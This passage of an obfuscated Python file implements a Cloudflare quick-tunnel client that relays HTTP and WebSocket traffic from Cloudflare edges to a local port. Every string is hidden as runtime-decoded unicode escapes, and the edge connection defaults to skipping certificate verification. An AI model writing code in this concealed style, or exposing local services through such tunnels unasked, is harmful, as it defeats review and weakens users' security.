        self.requests[O0_var_1509.id] = {codecs.decode('\\u0073\\u0074\\u0072\\u0065\\u0061\\u006d', 'unicode_escape'): O0_var_1509, codecs.decode('\\u0062\\u0075\\u0066\\u0066\\u0065\\u0072', 'unicode_escape'): b'', codecs.decode('\\u0062\\u006f\\u0064\\u0079', 'unicode_escape'): b'', codecs.decode('\\u0072\\u0065\\u0071\\u0075\\u0065\\u0073\\u0074', 'unicode_escape'): None, codecs.decode('\\u0077\\u0065\\u0062\\u0073\\u006f\\u0063\\u006b\\u0065\\u0074', 'unicode_escape'): False, codecs.decode('\\u0072\\u0065\\u006c\\u0061\\u0079', 'unicode_escape'): None, codecs.decode('\\u0065\\u006e\\u0064\\u0065\\u0064', 'unicode_escape'): False, codecs.decode('\\u0073\\u0065\\u0072\\u0076\\u0065\\u0064', 'unicode_escape'): False, codecs.decode('\\u0066\\u0061\\u0069\\u006c\\u0065\\u0064', 'unicode_escape'): False}

    def receive_stream(self, O0_var_1510, data):
        if self.control is not None and O0_var_1510.id == self.control.stream_id:
            self.control.feed(data)
            return
        O0_var_1511 = self.requests.get(O0_var_1510.id)
        if O0_var_1511 is None or O0_var_1511[codecs.decode('\\u0066\\u0061\\u0069\\u006c\\u0065\\u0064', 'unicode_escape')]:
            return
        if O0_var_1511[codecs.decode('\\u0072\\u0065\\u0071\\u0075\\u0065\\u0073\\u0074', 'unicode_escape')] is None:
            O0_var_1511[codecs.decode('\\u0062\\u0075\\u0066\\u0066\\u0065\\u0072', 'unicode_escape')] += data
            self.parse_request(O0_var_1511)
        elif data:
            if O0_var_1511[codecs.decode('\\u0077\\u0065\\u0062\\u0073\\u006f\\u0063\\u006b\\u0065\\u0074', 'unicode_escape')] and O0_var_1511[codecs.decode('\\u0072\\u0065\\u006c\\u0061\\u0079', 'unicode_escape')] is not None:
                O0_var_1511[codecs.decode('\\u0072\\u0065\\u006c\\u0061\\u0079', 'unicode_escape')].feed(data)
            else:
                O0_var_1511[codecs.decode('\\u0062\\u006f\\u0064\\u0079', 'unicode_escape')] += data
        self.maybe_serve(O0_var_1511)

    def end_stream(self, O0_var_1512):
        if self.control is not None and O0_var_1512.id == self.control.stream_id:
            self.control.finished = True
            return
        O0_var_1513 = self.requests.get(O0_var_1512.id)
        if O0_var_1513 is None:
            return
        O0_var_1513[codecs.decode('\\u0065\\u006e\\u0064\\u0065\\u0064', 'unicode_escape')] = True
        if O0_var_1513[codecs.decode('\\u0077\\u0065\\u0062\\u0073\\u006f\\u0063\\u006b\\u0065\\u0074', 'unicode_escape')] and O0_var_1513[codecs.decode('\\u0072\\u0065\\u006c\\u0061\\u0079', 'unicode_escape')] is not None:
            O0_var_1513[codecs.decode('\\u0072\\u0065\\u006c\\u0061\\u0079', 'unicode_escape')].feed(None)
            return
        if O0_var_1513[codecs.decode('\\u0072\\u0065\\u0071\\u0075\\u0065\\u0073\\u0074', 'unicode_escape')] is not None:
            self.maybe_serve(O0_var_1513)
        else:
            self.requests.pop(O0_var_1512.id, None)

    def parse_request(self, O0_var_1514):
        O0_var_1515 = O0_var_1514[codecs.decode('\\u0062\\u0075\\u0066\\u0066\\u0065\\u0072', 'unicode_escape')]
        if len(O0_var_1515) < len(QUIC_DATA_STREAM_PREAMBLE):
            return
        if O0_var_1515[:len(QUIC_DATA_STREAM_SIGNATURE)] != QUIC_DATA_STREAM_SIGNATURE:
            self.log.warning(codecs.decode('\\u0073\\u0074\\u0072\\u0065\\u0061\\u006d\\u0020\\u0025\\u0064\\u0020\\u0069\\u0073\\u0020\\u006e\\u006f\\u0074\\u0020\\u0061\\u0020\\u0076\\u0031\\u0020\\u0074\\u0075\\u006e\\u006e\\u0065\\u006c\\u0020\\u0064\\u0061\\u0074\\u0061\\u0020\\u0073\\u0074\\u0072\\u0065\\u0061\\u006d', 'unicode_escape'), O0_var_1514[codecs.decode('\\u0073\\u0074\\u0072\\u0065\\u0061\\u006d', 'unicode_escape')].id)
            O0_var_1514[codecs.decode('\\u0066\\u0061\\u0069\\u006c\\u0065\\u0064', 'unicode_escape')] = True
            return
        if O0_var_1515[6:8] != b'01':
            self.log.warning(codecs.decode('\\u0073\\u0074\\u0072\\u0065\\u0061\\u006d\\u0020\\u0025\\u0064\\u0020\\u0075\\u0073\\u0065\\u0073\\u0020\\u0074\\u0075\\u006e\\u006e\\u0065\\u006c\\u0020\\u0070\\u0072\\u006f\\u0074\\u006f\\u0063\\u006f\\u006c\\u0020\\u0025\\u0073', 'unicode_escape'), O0_var_1514[codecs.decode('\\u0073\\u0074\\u0072\\u0065\\u0061\\u006d', 'unicode_escape')].id, O0_var_1515[6:8].decode(codecs.decode('\\u006c\\u0061\\u0074\\u0069\\u006e\\u002d\\u0031', 'unicode_escape')))
            O0_var_1514[codecs.decode('\\u0066\\u0061\\u0069\\u006c\\u0065\\u0064', 'unicode_escape')] = True
            return
        O0_var_1516, O0_var_1517 = O0_fn_14(O0_var_1515[len(QUIC_DATA_STREAM_PREAMBLE):])
        if not O0_var_1516:
            return
        try:
            O0_var_1518 = O0_fn_20(O0_var_1516[0])
        except Exception as exc:
            self.log.warning(codecs.decode('\\u0073\\u0074\\u0072\\u0065\\u0061\\u006d\\u0020\\u0025\\u0064\\u0020\\u0068\\u0061\\u0073\\u0020\\u0061\\u006e\\u0020\\u0075\\u006e\\u0072\\u0065\\u0061\\u0064\\u0061\\u0062\\u006c\\u0065\\u0020\\u0043\\u006f\\u006e\\u006e\\u0065\\u0063\\u0074\\u0052\\u0065\\u0071\\u0075\\u0065\\u0073\\u0074\\u003a\\u0020\\u0025\\u0073', 'unicode_escape'), O0_var_1514[codecs.decode('\\u0073\\u0074\\u0072\\u0065\\u0061\\u006d', 'unicode_escape')].id, exc)
            O0_var_1514[codecs.decode('\\u0066\\u0061\\u0069\\u006c\\u0065\\u0064', 'unicode_escape')] = True
            return
        O0_var_1514[codecs.decode('\\u0062\\u006f\\u0064\\u0079', 'unicode_escape')] = O0_var_1517
        O0_var_1514[codecs.decode('\\u0062\\u0075\\u0066\\u0066\\u0065\\u0072', 'unicode_escape')] = b''
        try:
            O0_var_1514[codecs.decode('\\u0072\\u0065\\u0071\\u0075\\u0065\\u0073\\u0074', 'unicode_escape')] = O0_fn_40(O0_var_1518)
            if O0_var_1514[codecs.decode('\\u0072\\u0065\\u0071\\u0075\\u0065\\u0073\\u0074', 'unicode_escape')][codecs.decode('\\u0074\\u0079\\u0070\\u0065', 'unicode_escape')] == QUIC_CONNECTION_TYPE[codecs.decode('\\u0077\\u0065\\u0062\\u0073\\u006f\\u0063\\u006b\\u0065\\u0074', 'unicode_escape')]:
                O0_var_1514[codecs.decode('\\u0077\\u0065\\u0062\\u0073\\u006f\\u0063\\u006b\\u0065\\u0074', 'unicode_escape')] = True
        except Exception as exc:
            self.log.warning(codecs.decode('\\u0073\\u0074\\u0072\\u0065\\u0061\\u006d\\u0020\\u0025\\u0064\\u003a\\u0020\\u0025\\u0073', 'unicode_escape'), O0_var_1514[codecs.decode('\\u0073\\u0074\\u0072\\u0065\\u0061\\u006d', 'unicode_escape')].id, exc)
            O0_var_1514[codecs.decode('\\u0066\\u0061\\u0069\\u006c\\u0065\\u0064', 'unicode_escape')] = True
            self.respond(O0_var_1514, str(exc), 502)

    def maybe_serve(self, O0_var_1519):
        if O0_var_1519[codecs.decode('\\u0073\\u0065\\u0072\\u0076\\u0065\\u0064', 'unicode_escape')] or O0_var_1519[codecs.decode('\\u0072\\u0065\\u0071\\u0075\\u0065\\u0073\\u0074', 'unicode_escape')] is None or O0_var_1519[codecs.decode('\\u0066\\u0061\\u0069\\u006c\\u0065\\u0064', 'unicode_escape')] or (not O0_fn_41(O0_var_1519)):
            return
        O0_var_1519[codecs.decode('\\u0073\\u0065\\u0072\\u0076\\u0065\\u0064', 'unicode_escape')] = True
        self.serve_request(O0_var_1519)

    def serve_request(self, O0_var_1520):
        O0_var_1521 = O0_var_1520[codecs.decode('\\u0073\\u0074\\u0072\\u0065\\u0061\\u006d', 'unicode_escape')]
        request = O0_var_1520[codecs.decode('\\u0072\\u0065\\u0071\\u0075\\u0065\\u0073\\u0074', 'unicode_escape')]
        if request[codecs.decode('\\u0074\\u0079\\u0070\\u0065', 'unicode_escape')] == QUIC_CONNECTION_TYPE[codecs.decode('\\u0077\\u0065\\u0062\\u0073\\u006f\\u0063\\u006b\\u0065\\u0074', 'unicode_escape')]:
            self.serve_websocket(O0_var_1520)
            return
        if request[codecs.decode('\\u0074\\u0079\\u0070\\u0065', 'unicode_escape')] != QUIC_CONNECTION_TYPE[codecs.decode('\\u0068\\u0074\\u0074\\u0070', 'unicode_escape')]:
            threading.Thread(target=self.respond, args=(O0_var_1520, codecs.decode('\\u0074\\u0075\\u006e\\u006e\\u0065\\u006c\\u0020\\u0063\\u006f\\u006e\\u006e\\u0065\\u0063\\u0074\\u0069\\u006f\\u006e\\u0020\\u0074\\u0079\\u0070\\u0065\\u0020\\u0025\\u0064\\u0020\\u0069\\u0073\\u0020\\u006e\\u006f\\u0074\\u0020\\u0070\\u0072\\u006f\\u0078\\u0069\\u0065\\u0064\\u0020\\u006f\\u0076\\u0065\\u0072\\u0020\\u0051\\u0055\\u0049\\u0043\\u0020\\u0079\\u0065\\u0074', 'unicode_escape') % request[codecs.decode('\\u0074\\u0079\\u0070\\u0065', 'unicode_escape')], 502), daemon=True).start()
            return
        threading.Thread(target=self._proxy_http, args=(O0_var_1520,), daemon=True).start()

    def _proxy_http(self, O0_var_1522):
        O0_var_1523 = O0_var_1522[codecs.decode('\\u0073\\u0074\\u0072\\u0065\\u0061\\u006d', 'unicode_escape')]
        request = O0_var_1522[codecs.decode('\\u0072\\u0065\\u0071\\u0075\\u0065\\u0073\\u0074', 'unicode_escape')]
        try:
            response = O0_fn_27(self.origin, request[codecs.decode('\\u006d\\u0065\\u0074\\u0068\\u006f\\u0064', 'unicode_escape')], request[codecs.decode('\\u0070\\u0061\\u0074\\u0068', 'unicode_escape')], request[codecs.decode('\\u0068\\u0065\\u0061\\u0064\\u0065\\u0072\\u0073', 'unicode_escape')], O0_var_1522[codecs.decode('\\u0062\\u006f\\u0064\\u0079', 'unicode_escape')])
            O0_var_1524 = response[codecs.decode('\\u0062\\u006f\\u0064\\u0079', 'unicode_escape')]
            O0_var_1525 = [(QUIC_META_STATUS, str(200 if response[codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape')] == 101 else response[codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape')]))]
            O0_var_1526 = False
            for O0_var_1527, O0_var_1528 in response[codecs.decode('\\u0068\\u0065\\u0061\\u0064\\u0065\\u0072\\u0073', 'unicode_escape')]:
                O0_var_1529 = O0_var_1527.lower()
                if O0_var_1529 == codecs.decode('\\u0074\\u0072\\u0061\\u006e\\u0073\\u0066\\u0065\\u0072\\u002d\\u0065\\u006e\\u0063\\u006f\\u0064\\u0069\\u006e\\u0067', 'unicode_escape'):
                    continue
                if O0_var_1529 == codecs.decode('\\u0063\\u006f\\u006e\\u0074\\u0065\\u006e\\u0074\\u002d\\u0074\\u0079\\u0070\\u0065', 'unicode_escape'):
                    O0_var_1526 = True
                O0_var_1525.append((QUIC_META_HEADER + codecs.decode('\\u003a', 'unicode_escape') + O0_var_1527, O0_var_1528))
            if not O0_var_1526:
                O0_var_1530 = O0_fn_22(request[codecs.decode('\\u0070\\u0061\\u0074\\u0068', 'unicode_escape')])
                if O0_var_1530:
                    O0_var_1525.append((QUIC_META_HEADER + codecs.decode('\\u003a\\u0043\\u006f\\u006e\\u0074\\u0065\\u006e\\u0074\\u002d\\u0054\\u0079\\u0070\\u0065', 'unicode_escape'), O0_var_1530))
            self.write_response(O0_var_1523, codecs.decode('', 'unicode_escape'), O0_var_1525, False)
            while True:
                O0_var_1531 = O0_var_1524.read(65536)
                if not O0_var_1531:
                    break
                O0_var_1523.write(O0_var_1531, False)
            O0_var_1523.write(b'', True)
        except Exception as exc:
            self.log.warning(codecs.decode('\\u0073\\u0074\\u0072\\u0065\\u0061\\u006d\\u0020\\u0025\\u0064\\u0020\\u0070\\u0072\\u006f\\u0078\\u0079\\u0020\\u0066\\u0061\\u0069\\u006c\\u0065\\u0064\\u003a\\u0020\\u0025\\u0073', 'unicode_escape'), O0_var_1523.id, exc)
            self.respond(O0_var_1522, str(exc), 502)
        finally:
            if not O0_var_1522[codecs.decode('\\u0077\\u0065\\u0062\\u0073\\u006f\\u0063\\u006b\\u0065\\u0074', 'unicode_escape')]:
                self.requests.pop(O0_var_1523.id, None)

    def serve_websocket(self, O0_var_1532):
        O0_var_1533 = QuicWebsocketRelay(self, O0_var_1532, O0_var_1532[codecs.decode('\\u0072\\u0065\\u0071\\u0075\\u0065\\u0073\\u0074', 'unicode_escape')], self.origin, self.log)
        O0_var_1532[codecs.decode('\\u0072\\u0065\\u006c\\u0061\\u0079', 'unicode_escape')] = O0_var_1533
        self.relays.add(O0_var_1533)
        if O0_var_1532[codecs.decode('\\u0062\\u006f\\u0064\\u0079', 'unicode_escape')]:
            O0_var_1533.feed(O0_var_1532[codecs.decode('\\u0062\\u006f\\u0064\\u0079', 'unicode_escape')])
            O0_var_1532[codecs.decode('\\u0062\\u006f\\u0064\\u0079', 'unicode_escape')] = b''
        threading.Thread(target=O0_var_1533.run, daemon=True).start()

    def respond(self, O0_var_1534, O0_var_1535, status):
        self.write_response(O0_var_1534[codecs.decode('\\u0073\\u0074\\u0072\\u0065\\u0061\\u006d', 'unicode_escape')], O0_var_1535, [(QUIC_META_STATUS, str(status))], True)

    def write_response(self, O0_var_1536, O0_var_1537, O0_var_1538, O0_var_1539):
        if self.stopped or O0_var_1536.send.fin:
            return
        O0_var_1536.write(QUIC_DATA_STREAM_PREAMBLE + O0_fn_21(O0_var_1537, O0_var_1538), O0_var_1539)

def O0_fn_42(logger, O0_var_1540=None, verify_certificate=False):
    O0_var_1541 = list(EDGE_HOSTS)
    secrets.SystemRandom().shuffle(O0_var_1541)
    O0_var_1542 = None
    for O0_var_1543 in O0_var_1541:
        O0_var_1544 = QuicConnection(O0_var_1543, EDGE_PORT, logger, server_name=QUIC_SERVER_NAME, alpn=QUIC_ALPN, idle_timeout=O0_var_1540 if O0_var_1540 else 30000, verify_certificate=verify_certificate)
        try:
            O0_var_1544.connect()
            logger.info(codecs.decode('\\u0063\\u006f\\u006e\\u006e\\u0065\\u0063\\u0074\\u0065\\u0064\\u0020\\u0074\\u006f\\u0020\\u0025\\u0073\\u003a\\u0025\\u0064\\u0020\\u006f\\u0076\\u0065\\u0072\\u0020\\u0051\\u0055\\u0049\\u0043', 'unicode_escape'), O0_var_1543, EDGE_PORT)
            return O0_var_1544
        except (OSError, Exception) as exc:
            O0_var_1542 = exc
            logger.warning(codecs.decode('\\u0065\\u0064\\u0067\\u0065\\u0020\\u0025\\u0073\\u0020\\u0066\\u0061\\u0069\\u006c\\u0065\\u0064\\u003a\\u0020\\u0025\\u0073', 'unicode_escape'), O0_var_1543, exc)
            try:
                O0_var_1544.close(codecs.decode('\\u0065\\u0064\\u0067\\u0065\\u0020\\u0063\\u006f\\u006e\\u006e\\u0065\\u0063\\u0074\\u0020\\u0066\\u0061\\u0069\\u006c\\u0065\\u0064', 'unicode_escape'))
            except Exception:
                pass
    raise OSError(codecs.decode('\\u0061\\u006c\\u006c\\u0020\\u0043\\u006c\\u006f\\u0075\\u0064\\u0066\\u006c\\u0061\\u0072\\u0065\\u0020\\u0065\\u0064\\u0067\\u0065\\u0073\\u0020\\u0066\\u0061\\u0069\\u006c\\u0065\\u0064\\u003a\\u0020\\u0025\\u0073', 'unicode_escape') % O0_var_1542)

class _ArgoLogAdapter:

    @staticmethod
    def _format(message, args):
        return message % args if args else message

    def debug(self, message, *args):
        Logger.debug(self._format(message, args))

    def info(self, message, *args):
        Logger.info(self._format(message, args))

    def warning(self, message, *args):
        Logger.warning(self._format(message, args))

    def error(self, message, *args):
        Logger.error(self._format(message, args))

def _run_domain_change_callback(O0_var_1545, O0_var_1546, O0_var_1547):
    try:
        O0_var_1545(O0_var_1546, O0_var_1547)
    except Exception as exc:
        Logger.debug(codecs.decode('\\u0061\\u0072\\u0067\\u006f\\u0020\\u0064\\u006f\\u006d\\u0061\\u0069\\u006e\\u0020\\u0063\\u0068\\u0061\\u006e\\u0067\\u0065\\u0020\\u0063\\u0061\\u006c\\u006c\\u0062\\u0061\\u0063\\u006b\\u0020\\u0066\\u0061\\u0069\\u006c\\u0065\\u0064\\u003a\\u0020\\u0025\\u0073', 'unicode_escape'), exc)

class CloudflareQuickTunnel:

    def __init__(self, port, logger=None, O0_var_1548=QUICK_SERVICE, O0_var_1549=2.0, verify_certificate=None, silent=False, use_quic=False, requester=None, source=codecs.decode('\\u0061\\u0070\\u0069', 'unicode_escape')):
        if verify_certificate is None:
            verify_certificate = os.getenv(codecs.decode('\\u004b\\u0049\\u0053\\u0041\\u004d\\u0041\\u005f\\u0045\\u0044\\u0047\\u0045\\u005f\\u0049\\u004e\\u0053\\u0045\\u0043\\u0055\\u0052\\u0045', 'unicode_escape'), codecs.decode('', 'unicode_escape')).strip().lower() != codecs.decode('\\u0074\\u0072\\u0075\\u0065', 'unicode_escape')
        self.port = port
        self.origin = codecs.decode('\\u0068\\u0074\\u0074\\u0070\\u003a\\u002f\\u002f\\u0031\\u0032\\u0037\\u002e\\u0030\\u002e\\u0030\\u002e\\u0031\\u003a\\u0025\\u0064', 'unicode_escape') % port
        self.log = logger if logger is not None else _ArgoLogAdapter()
        self.quick_service = O0_var_1548
        self.retry_seconds = O0_var_1549
        self.verify_certificate = verify_certificate
        self.silent = silent
        self.source = source
        self.transport = codecs.decode('\\u0071\\u0075\\u0069\\u0063', 'unicode_escape') if use_quic else codecs.decode('\\u0068\\u0032', 'unicode_escape')
        self.quic_failures = 0
        self.hostname = None
        self.created_at = None
        self.status = codecs.decode('\\u0061\\u006c\\u0069\\u0076\\u0065', 'unicode_escape')
        self.last_error = None
        self.last_error_at = None
        self.consecutive_failures = 0
        self.last_registered_at = None
        self.on_domain_change = None
        self.shz_name = None
        self.shz_key = None
        self.shz_key_explicit = False
        self._stop = threading.Event()
        self._thread = None
        self._sock = None
        self._conn = None
        self._requester = requester
        self._tunnel_state = {codecs.decode('\\u0070\\u0072\\u0069\\u006e\\u0074\\u0065\\u0064', 'unicode_escape'): False}

    def start(self):
        if self._thread is not None and self._thread.is_alive():
            return self.hostname
        O0_var_1550 = self._requester or O0_fn_24
        O0_var_1551, O0_var_1552, O0_var_1553, O0_var_1554 = O0_var_1550(self.quick_service)
        self.hostname = O0_var_1551 if O0_var_1551.startswith(codecs.decode('\\u0068\\u0074\\u0074\\u0070\\u0073\\u003a\\u002f\\u002f', 'unicode_escape')) else codecs.decode('\\u0068\\u0074\\u0074\\u0070\\u0073\\u003a\\u002f\\u002f', 'unicode_escape') + O0_var_1551
        self.created_at = int(time.time())
        self._stop.clear()
        self._sock = None
        self._thread = threading.Thread(target=self._run_loop, args=(O0_var_1552, O0_var_1553, O0_var_1554), daemon=True, name=codecs.decode('\\u0061\\u0072\\u0067\\u006f\\u002d\\u0074\\u0075\\u006e\\u006e\\u0065\\u006c\\u002d\\u0025\\u0064', 'unicode_escape') % self.port)
        self._thread.start()
        return self.hostname

    def _run_loop(self, O0_var_1555, O0_var_1556, O0_var_1557):
        self.consecutive_failures = 0
        O0_var_1558 = 0
        O0_var_1559 = None
        try:
            while not self._stop.is_set():
                O0_var_1560 = None
                O0_var_1561 = None
                O0_var_1562 = None
                try:
                    if self.transport == codecs.decode('\\u0071\\u0075\\u0069\\u0063', 'unicode_escape'):
                        O0_var_1563 = ARGO_IDLE_TIMEOUT * 1000 if ARGO_IDLE_TIMEOUT > 0 else 30000
                        O0_var_1562 = O0_fn_42(self.log, O0_var_1563, self.verify_certificate)
                        if self._stop.is_set():
                            O0_var_1562.close(codecs.decode('\\u0074\\u0075\\u006e\\u006e\\u0065\\u006c\\u0020\\u0072\\u0065\\u006d\\u006f\\u0076\\u0065\\u0064', 'unicode_escape'))
                            return
                        self._conn = O0_var_1562
                        O0_var_1558 = (O0_var_1558 + 1) % 4
                        O0_var_1564 = QuicSession(O0_var_1562, self.origin, O0_var_1555, O0_var_1556, O0_var_1557, O0_var_1558, self.log)
                        O0_var_1564.run()
                    else:
                        O0_var_1560 = O0_fn_30(self.verify_certificate, self.log)
                        self._sock = O0_var_1560
                        O0_var_1558 = (O0_var_1558 + 1) % 4
                        O0_var_1561 = H2Connection(O0_var_1560, self.origin, O0_var_1555, O0_var_1556, O0_var_1557, O0_var_1558, self.log, self.hostname, not self.silent, self._tunnel_state)
                        O0_var_1561.run()
                except KeyboardInterrupt:
                    return
                except Exception as exc:
                    if not self._stop.is_set():
                        self.log.warning(codecs.decode('\\u0074\\u0075\\u006e\\u006e\\u0065\\u006c\\u0020\\u0063\\u006f\\u006e\\u006e\\u0065\\u0063\\u0074\\u0069\\u006f\\u006e\\u0020\\u0063\\u006c\\u006f\\u0073\\u0065\\u0064\\u003a\\u0020\\u0025\\u0073', 'unicode_escape'), exc)
                        self.status = codecs.decode('\\u0072\\u0065\\u0063\\u006f\\u006e\\u006e\\u0065\\u0063\\u0074\\u0069\\u006e\\u0067', 'unicode_escape')
                        self.last_error = _argo_truncate_error(exc)
                        self.last_error_at = datetime.fromtimestamp(time.time(), timezone.utc).isoformat().replace(codecs.decode('\\u002b\\u0030\\u0030\\u003a\\u0030\\u0030', 'unicode_escape'), codecs.decode('\\u005a', 'unicode_escape'))
                        O0_var_1559 = exc
                finally:
                    if O0_var_1560 is not None:
                        try:
                            O0_var_1560.close()
                        except OSError:
                            pass
                    if O0_var_1562 is not None:
                        try:
                            O0_var_1562.close(codecs.decode('\\u0074\\u0075\\u006e\\u006e\\u0065\\u006c\\u0020\\u0063\\u006c\\u006f\\u0073\\u0065\\u0064', 'unicode_escape'))
                        except Exception:
                            pass
                    self._sock = None
                    self._conn = None
                if self._stop.is_set():
                    return
                O0_var_1565 = O0_var_1561 is not None and O0_var_1561.registered or (O0_var_1562 is not None and O0_var_1562.registered)
                if O0_var_1565:
                    self.consecutive_failures = 0
                    self.quic_failures = 0
                    self.status = codecs.decode('\\u0061\\u006c\\u0069\\u0076\\u0065', 'unicode_escape')
                    self.last_error = None
                    self.last_error_at = None
                    self.last_registered_at = int(time.time())
                    O0_var_1559 = None
                else:
                    self.consecutive_failures += 1
                    if self.status != codecs.decode('\\u0066\\u0061\\u0069\\u006c\\u0065\\u0064', 'unicode_escape'):
                        self.status = codecs.decode('\\u0072\\u0065\\u0063\\u006f\\u006e\\u006e\\u0065\\u0063\\u0074\\u0069\\u006e\\u0067', 'unicode_escape')
                    if self.transport == codecs.decode('\\u0071\\u0075\\u0069\\u0063', 'unicode_escape'):
                        self.quic_failures += 1
                        if self.quic_failures >= ARGO_REREGISTER_AFTER:
                            self.transport = codecs.decode('\\u0068\\u0032', 'unicode_escape')
                            self.log.warning(codecs.decode('\\u0061\\u0072\\u0067\\u006f\\u0020\\u0074\\u0075\\u006e\\u006e\\u0065\\u006c\\u0020\\u0025\\u0073\\u003a\\u0020\\u0051\\u0055\\u0049\\u0043\\u0020\\u8fde\\u7eed\\u0020\\u0025\\u0064\\u0020\\u8f6e\\u5efa\\u8fde\\u5931\\u8d25\\u002c\\u0020\\u5df2\\u81ea\\u52a8\\u56de\\u9000\\u0020\\u0068\\u0032\\u0020\\u4f20\\u8f93\\u0020\\u0028\\u91cd\\u542f\\u8fdb\\u7a0b\\u6062\\u590d\\u0020\\u0051\\u0055\\u0049\\u0043\\u0029', 'unicode_escape'), self.hostname, self.quic_failures)
                            self.quic_failures = 0
                    if self.consecutive_failures >= ARGO_REREGISTER_AFTER:
                        O0_var_1566 = self._reregister()
                        if O0_var_1566 is not None:
                            O0_var_1555, O0_var_1556, O0_var_1557 = O0_var_1566
                            self.consecutive_failures = 0
                            self.quic_failures = 0
                            self.status = codecs.decode('\\u0061\\u006c\\u0069\\u0076\\u0065', 'unicode_escape')
                            self.last_error = None
                            self.last_error_at = None
                            self.last_registered_at = int(time.time())
                        else:
                            if self.status != codecs.decode('\\u0066\\u0061\\u0069\\u006c\\u0065\\u0064', 'unicode_escape'):
                                self.status = codecs.decode('\\u0066\\u0061\\u0069\\u006c\\u0065\\u0064', 'unicode_escape')
                                if self.last_error is None:
                                    self.last_error = codecs.decode('\\u0074\\u0075\\u006e\\u006e\\u0065\\u006c\\u0020\\u0072\\u0065\\u002d\\u0072\\u0065\\u0067\\u0069\\u0073\\u0074\\u0065\\u0072\\u0020\\u0066\\u0061\\u0069\\u006c\\u0065\\u0064', 'unicode_escape')
                                    self.last_error_at = datetime.fromtimestamp(time.time(), timezone.utc).isoformat().replace(codecs.decode('\\u002b\\u0030\\u0030\\u003a\\u0030\\u0030', 'unicode_escape'), codecs.decode('\\u005a', 'unicode_escape'))
                            if self._stop.wait(_argo_backoff_seconds(self.consecutive_failures)):
                                return
                if not self._stop.is_set():
                    self._stop.wait(_argo_backoff_seconds(self.consecutive_failures) if self.consecutive_failures > 0 else self.retry_seconds)
        except Exception as exc:
            if O0_var_1559 is None:
                O0_var_1559 = exc
            if not self._stop.is_set():
                self.status = codecs.decode('\\u0066\\u0061\\u0069\\u006c\\u0065\\u0064', 'unicode_escape')
                self.last_error = _argo_truncate_error(O0_var_1559)
                self.last_error_at = datetime.fromtimestamp(time.time(), timezone.utc).isoformat().replace(codecs.decode('\\u002b\\u0030\\u0030\\u003a\\u0030\\u0030', 'unicode_escape'), codecs.decode('\\u005a', 'unicode_escape'))
            raise

    def _reregister(self):
        try:
            O0_var_1567 = self._requester or O0_fn_24
            O0_var_1568, O0_var_1569, O0_var_1570, O0_var_1571 = O0_var_1567(self.quick_service)
        except Exception as exc:
            self.log.warning(codecs.decode('\\u0074\\u0075\\u006e\\u006e\\u0065\\u006c\\u0020\\u0072\\u0065\\u002d\\u0072\\u0065\\u0067\\u0069\\u0073\\u0074\\u0065\\u0072\\u0020\\u0066\\u0061\\u0069\\u006c\\u0065\\u0064\\u003a\\u0020\\u0025\\u0073', 'unicode_escape'), exc)
            return None
        O0_var_1572 = self.hostname
        self.hostname = O0_var_1568 if O0_var_1568.startswith(codecs.decode('\\u0068\\u0074\\u0074\\u0070\\u0073\\u003a\\u002f\\u002f', 'unicode_escape')) else codecs.decode('\\u0068\\u0074\\u0074\\u0070\\u0073\\u003a\\u002f\\u002f', 'unicode_escape') + O0_var_1568
        self.created_at = int(time.time())
        self._tunnel_state[codecs.decode('\\u0070\\u0072\\u0069\\u006e\\u0074\\u0065\\u0064', 'unicode_escape')] = True
        self.log.warning(codecs.decode('\\u0074\\u0075\\u006e\\u006e\\u0065\\u006c\\u0020\\u0064\\u006f\\u006d\\u0061\\u0069\\u006e\\u0020\\u0063\\u0068\\u0061\\u006e\\u0067\\u0065\\u0064\\u003a\\u0020\\u0025\\u0073\\u0020\\u002d\\u003e\\u0020\\u0025\\u0073', 'unicode_escape'), O0_var_1572, self.hostname)
        O0_var_1573 = self.on_domain_change
        if O0_var_1573 is not None:
            threading.Thread(target=_run_domain_change_callback, args=(O0_var_1573, O0_var_1572, self.hostname), daemon=True, name=codecs.decode('\\u0061\\u0072\\u0067\\u006f\\u002d\\u0064\\u006f\\u006d\\u0061\\u0069\\u006e\\u002d\\u0063\\u0068\\u0061\\u006e\\u0067\\u0065', 'unicode_escape')).start()
        return (O0_var_1569, O0_var_1570, O0_var_1571)

    def stop(self):
        self._stop.set()
        O0_var_1574 = self._sock
        if O0_var_1574 is not None:
            try:
                O0_var_1574.shutdown(socket.SHUT_RDWR)
            except OSError:
                pass
            try:
                O0_var_1574.close()
            except OSError:
                pass
        O0_var_1575 = self._conn
        if O0_var_1575 is not None:
            try:
                O0_var_1575.close(codecs.decode('\\u0074\\u0075\\u006e\\u006e\\u0065\\u006c\\u0020\\u0072\\u0065\\u006d\\u006f\\u0076\\u0065\\u0064', 'unicode_escape'))
            except Exception:
                pass
        if self._thread is not None:
            self._thread.join(timeout=2)

class ArgoTunnelError(Exception):

    def __init__(self, status_code, message):
        super().__init__(message)
        self.status_code = status_code
        self.message = message

class ArgoTunnelManager:

    def __init__(self, logger=None, store=None):
        self._tunnels = []
        self._by_port = {}
        self._lock = threading.Lock()
        self.log = logger if logger is not None else _ArgoLogAdapter()
        self.on_domain_change = None
        self.store = store
        self._requester = None

    def list_tunnels(self):
        with self._lock:
            return [{codecs.decode('\\u0074\\u0075\\u006e\\u006e\\u0065\\u006c\\u005f\\u0064\\u006f\\u006d\\u0061\\u0069\\u006e', 'unicode_escape'): O0_var_1576.hostname, codecs.decode('\\u0070\\u006f\\u0072\\u0074', 'unicode_escape'): O0_var_1576.port, codecs.decode('\\u0063\\u0072\\u0065\\u0061\\u0074\\u0065\\u0064\\u005f\\u0061\\u0074', 'unicode_escape'): datetime.fromtimestamp(O0_var_1576.created_at, timezone.utc).isoformat().replace(codecs.decode('\\u002b\\u0030\\u0030\\u003a\\u0030\\u0030', 'unicode_escape'), codecs.decode('\\u005a', 'unicode_escape')), codecs.decode('\\u0074\\u0072\\u0061\\u006e\\u0073\\u0070\\u006f\\u0072\\u0074', 'unicode_escape'): O0_var_1576.transport, codecs.decode('\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'): O0_var_1576.status, codecs.decode('\\u006c\\u0061\\u0073\\u0074\\u005f\\u0065\\u0072\\u0072\\u006f\\u0072', 'unicode_escape'): O0_var_1576.last_error, codecs.decode('\\u006c\\u0061\\u0073\\u0074\\u005f\\u0065\\u0072\\u0072\\u006f\\u0072\\u005f\\u0061\\u0074', 'unicode_escape'): O0_var_1576.last_error_at, 